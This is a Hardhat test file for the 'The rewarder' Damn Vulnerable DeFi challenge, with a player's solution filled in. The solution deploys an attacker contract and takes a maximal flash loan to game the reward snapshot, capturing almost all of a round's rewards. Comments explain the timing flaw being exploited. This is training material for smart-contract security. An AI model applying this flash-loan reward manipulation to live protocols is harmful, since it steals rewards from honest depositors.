const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {
    const TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens
    let users, deployer, alice, bob, charlie, david, player;
    let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        liquidityToken = await DamnValuableTokenFactory.deploy();
        flashLoanPool = await FlashLoanerPoolFactory.deploy(liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        rewarderPool = await TheRewarderPoolFactory.deploy(liquidityToken.address);
        rewardToken = RewardTokenFactory.attach(await rewarderPool.rewardToken());
        accountingToken = AccountingTokenFactory.attach(await rewarderPool.accountingToken());

        // Check roles in accounting token
        expect(await accountingToken.owner()).to.eq(rewarderPool.address);
        const minterRole = await accountingToken.MINTER_ROLE();
        const snapshotRole = await accountingToken.SNAPSHOT_ROLE();
        const burnerRole = await accountingToken.BURNER_ROLE();
        expect(await accountingToken.hasAllRoles(rewarderPool.address, minterRole | snapshotRole | burnerRole)).to.be.true;

        // Alice, Bob, Charlie and David deposit tokens
        let depositAmount = 100n * 10n ** 18n; 
        for (let i = 0; i < users.length; i++) {
            await liquidityToken.transfer(users[i].address, depositAmount);
            await liquidityToken.connect(users[i]).approve(rewarderPool.address, depositAmount);
            await rewarderPool.connect(users[i]).deposit(depositAmount);
            expect(
                await accountingToken.balanceOf(users[i].address)
            ).to.be.eq(depositAmount);
        }


        expect(await accountingToken.totalSupply()).to.be.eq(depositAmount * BigInt(users.length));
        expect(await rewardToken.totalSupply()).to.be.eq(0);

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        // Each depositor gets reward tokens
        let rewardsInRound = await rewarderPool.REWARDS();
        for (let i = 0; i < users.length; i++) {
            await rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await rewardToken.balanceOf(users[i].address)
            ).to.be.eq(rewardsInRound.div(users.length));
        }

        expect(await rewardToken.totalSupply()).to.be.eq(rewardsInRound);

        // Player starts with zero DVT tokens in balance
        expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
        
        // Two rounds must have occurred so far
        expect(await rewarderPool.roundNumber()).to.be.eq(2);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Current stage:in the round2
        /**
         * 1: the users have gotten the rewards
         *   Because lastRewardTimestamps[account] = lastRecordedSnapshotTimestamp and which is bigger than 5 days, so the user can't get the rewards again unless in the next round
         * 2: current lastSnapshotIdForRewards and SnapShotId =2 
           3. Now based on the snapshotid =2, can get the user's accountTokening balance as below
                ids [1], values [0] each user address
                ids [1], values [0] total supply
        */

        let id = await  rewarderPool.lastSnapshotIdForRewards(); 
        console.log("current lastSnapshotId or current round:",id);
        let totalDeposits = await accountingToken.totalSupplyAt(id);
        console.log("Current total accountingToken balance:",totalDeposits);
        let aliceAmountDeposited = await accountingToken.balanceOfAt(alice.address,id);
        console.log("Current alice's accountingToken balance:",aliceAmountDeposited);
        let aliceRewards = await rewardToken.balanceOf(alice.address);
        console.log("aliceRewards",aliceRewards);

        // 5 days passed
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        
        // attacker deposit the liquidityToken by flashloan, the new snpshotID will generated, also get the rewards, Lastly transfer all rewards to player
        let TheRewarderPoolHackerFactory = await ethers.getContractFactory('TheRewarderPoolHacker', deployer);
        let theRewarderPoolHacker = await TheRewarderPoolHackerFactory.deploy(flashLoanPool.address,rewarderPool.address);

        let maxFlashLoanAmount = await liquidityToken.balanceOf(flashLoanPool.address);
        console.log("flash loan starting.........");
        console.log("Max flashloan amount",maxFlashLoanAmount);
        await theRewarderPoolHacker.connect(player).attack(maxFlashLoanAmount);

        // after flasloan, show the accountingToken and rewardToken info
        id = await  rewarderPool.lastSnapshotIdForRewards(); 
        console.log("after flash loan, show the change of the accountingToken");
        console.log("current snapShotId:",id);
        totalDeposits = await accountingToken.totalSupplyAt(id);
        console.log("Current total accountingToken balance:",totalDeposits);
        let playerRewards = await rewardToken.balanceOf(player.address);
        console.log("Current player's rewards",playerRewards);

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Only one round must have taken place
        expect(
            await rewarderPool.roundNumber()
        ).to.be.eq(3);

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await rewarderPool.connect(users[i]).distributeRewards();
            const userRewards = await rewardToken.balanceOf(users[i].address);
            // console.log("User rewards",userRewards);
            const delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));
            expect(delta).to.be.lt(10n ** 16n)
        }
        
        // Rewards must have been issued to the player account
        expect(await rewardToken.totalSupply()).to.be.gt(await rewarderPool.REWARDS());
        const playerRewards = await rewardToken.balanceOf(player.address);
        expect(playerRewards).to.be.gt(0);

        // The amount of rewards earned should be close to total available amount
        const delta = (await rewarderPool.REWARDS()).sub(playerRewards);
        expect(delta).to.be.lt(10n ** 17n);

        // Balance of DVT tokens in player and lending pool hasn't changed
        expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
        expect(
            await liquidityToken.balanceOf(flashLoanPool.address)
        ).to.eq(TOKENS_IN_LENDER_POOL);
    });
});
